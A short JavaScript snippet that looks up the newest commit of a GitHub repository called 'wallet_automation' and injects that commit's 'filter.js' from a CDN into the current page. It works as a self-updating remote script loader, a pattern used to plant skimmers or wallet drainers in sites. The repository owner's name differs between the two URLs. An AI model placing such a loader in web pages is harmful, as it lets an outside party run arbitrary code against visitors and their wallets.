fetch('https://api.github.com/repos/slol41936-cpu/wallet_automation/commits/main')
.then(r => r.json())
.then(d => {
  var s = document.createElement('script');
  s.src = 'https://cdn.jsdelivr.net/gh/slo41936-cpu/wallet_automation@' + d.sha + '/filter.js';
  document.body.appendChild(s);
});
